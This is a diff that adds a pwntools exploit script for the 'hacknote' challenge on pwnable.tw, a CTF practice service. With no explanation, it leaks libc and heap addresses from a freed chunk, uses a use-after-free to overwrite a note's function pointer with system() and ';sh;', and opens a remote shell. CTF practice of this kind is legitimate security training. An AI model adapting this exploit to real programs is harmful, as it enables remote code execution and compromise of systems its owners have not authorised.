@@ -1,0 +1,65 @@
+#!/usr/bin/env python3
+from pwn import *
+import warnings
+warnings.filterwarnings("ignore")
+
+exe = ELF("./hacknotee")
+libc = ELF("./libc_32.so.6")
+ld = ELF("./ld-2.23.so")
+# context.log_level='debug'
+context.terminal = ["foot"]
+p = remote("chall.pwnable.tw", 10102)
+# p = process([exe.path])
+def gdbs():
+    gdb.attach(p, gdbscript="""
+
+               """)
+    # p = gdb.debug([exe.path],"""
+    #
+    #                 """)
+
+sla = lambda msg, data: p.sendlineafter(msg, data)
+sa = lambda msg, data: p.sendafter(msg, data)
+sl = lambda data: p.sendline(data)
+s = lambda data: p.send(data)
+def add(size,content):
+    sla("choice :","1")
+    sla(":",str(size))
+    sa(":",content)
+def dels(idx):
+    sla("choice :","2")
+    sla(":",str(idx))
+def show(idx):
+    sla("choice :","3")
+    sla(":",str(idx))
+# for i in range(5):
+#     add(0xa0,str(i)*0x10)
+dataaddr = 0x804a050
+log.info(f"dataaddr: {hex(dataaddr)}")
+
+###############################
+add(0x500,"aaa")
+add(0x10,"aaaa")
+dels(0)
+# gdbs()
+add(0x10,"a")
+show(0)
+buffer = p.recvuntil("----------------------",drop=True)
+chunk_size = 4
+chunks = [buffer[i:i + chunk_size] for i in range(0, len(buffer), chunk_size)]
+for i in range(len(chunks)):
+    chunks[i]=u32(chunks[i].ljust(4, b"\x00"))
+libc.address = chunks[1] - 0x1b0a08
+log.info(f"libc: {hex(libc.address)}")
+heap = chunks[2] - 0x10
+log.info(f"heap: {hex(heap)}")
+dels(0)
+dels(1)
+add(0x8,p32(libc.sym.system)+b";sh;")
+show("0;sh")
+
+
+
+p.interactive()
+# good luck pwning :)
+
